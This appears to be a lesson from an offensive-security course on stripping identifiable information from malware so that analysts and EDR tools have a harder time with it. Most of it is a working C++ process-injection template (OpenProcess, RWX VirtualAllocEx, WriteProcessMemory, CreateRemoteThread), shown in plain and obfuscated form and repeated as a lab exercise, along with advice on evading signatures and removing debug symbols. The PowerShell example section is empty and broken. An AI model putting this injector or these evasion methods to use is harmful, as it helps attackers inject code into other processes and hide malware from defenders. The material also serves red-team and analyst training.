# Protecting and stripping identifiable information

Consider three different types of identifiable data: object names, code structure, and file/compilation properties.

## Object names

Object names offer some of the most significant insight into a program's functionality and can reveal the exact 
purpose of a function. An analyst can still deconstruct the purpose of a function from its behaviour, but this is 
much harder if there is no context to the function.

The importance of literal object names may change depending on if the language is compiled  or interpreted. If an 
interpreted language such as Python or PowerShell is used, then all objects matter and must be modified. If a 
compiled language such as C, C# or C++ is used, only objects appearing in the strings are generally significant. An 
object may appear in the strings by any function that produces an IO operation.

### Example in C++

As example, a process injector written in C++ that reports its status to the command line:

```text
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	string leaked = "This was leaked in the strings";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	cout << "Handle obtained for" << processHandle;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	cout << "Buffer Created";
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	cout << "Process written with buffer" << remoteBuffer;
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	cout << "Closing handle" << processHandle;
	cout << leaked;

	return 0;
}
```

Compare with obfuscated version:

```text
#include "windows.h"

int main(int argc, char* argv[])
{
	unsigned char awoler[] = "";

	HANDLE awerfu;
	HANDLE rwfhbf;
	PVOID iauwef;

	awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
	rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
	CloseHandle(awerfu);

	return 0;
}
```

### Example with powershell

```

Some cmdlets and functions are kept in their original state to create an application that can still confuse reverse 
engineers after detection but may not look immediately suspicious. If a malware developer were to obfuscate all 
cmdlets and functions, it would raise the entropy in both interpreted and compiled languages resulting in higher 
EDR alert scores. It could also lead to an interpreted snippet appearing suspicious in logs if it is seemingly 
random or visibly heavily obfuscated.

## Code structure

Code structure can be a problem when dealing with all aspects of malicious code that are often overlooked and not 
easily identified. If not adequately addressed in both interpreted and compiled languages, it can lead to signatures 
or easier reverse engineering from an analyst.

As mentioned in the [taxonomy paper](principles.md), `junk code` and `reordering code` are both used as additional 
measures to add complexity to an interpreted program. Because the program is not compiled, an analyst has much greater 
insight into the program, and if not artificially inflated with complexity, they can focus on the exact malicious 
functions of an application.

Separation of related code can impact both interpreted and compiled languages and result in hidden signatures 
that may be hard to identify. A heuristic signature engine may determine whether a program is malicious based on 
the surrounding functions or API calls. To circumvent these signatures, an attacker can randomize the occurrence 
of related code to fool the engine into believing it is a safe call or function.

## File & Compilation Properties

More minor aspects of a compiled binary, such as the compilation method, may not seem like a critical component, but 
they can lead to several advantages to assist an analyst. For example, if a program is compiled as a debug build, 
an analyst can obtain all the available global variables and other program information.

The compiler will include a symbol file when a program is compiled as a debug build. Symbols commonly aid in 
debugging a binary image and can contain global and local variables, function names, and entry points. Attackers 
must be aware of these possible problems to ensure proper compilation practices and that no information is leaked 
to an analyst.

Luckily for attackers, symbol files are easily removed through the compiler or after compilation. To remove symbols 
from a compiler like Visual Studio, change the compilation target from `Debug` to `Release` or use a lighter-weight 
compiler like mingw.

To remove symbols from a pre-compiled image, use the `strip` command-line utility.

[Layered Obfuscation Taxonomy](principles.md) summarises these practices well under the `code-element` layer’s 
`stripping redundant symbols` method.

## Lab it up

Remove any meaningful identifiers or debug information from this C++ source code:

```text
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	string leaked = "This was leaked in the strings";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	cout << "Handle obtained for" << processHandle;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	cout << "Buffer Created";
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	cout << "Process written with buffer" << remoteBuffer;
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	cout << "Closing handle" << processHandle;
	cout << leaked;

	return 0;
} 
```

Obfuscated:

```text
#include "windows.h"

int main(int argc, char* argv[])
{
	unsigned char awoler[] = "";

	HANDLE awerfu;
	HANDLE rwfhbf;
	PVOID iauwef;

	awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
	rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
	CloseHandle(awerfu);

	return 0;
}
```
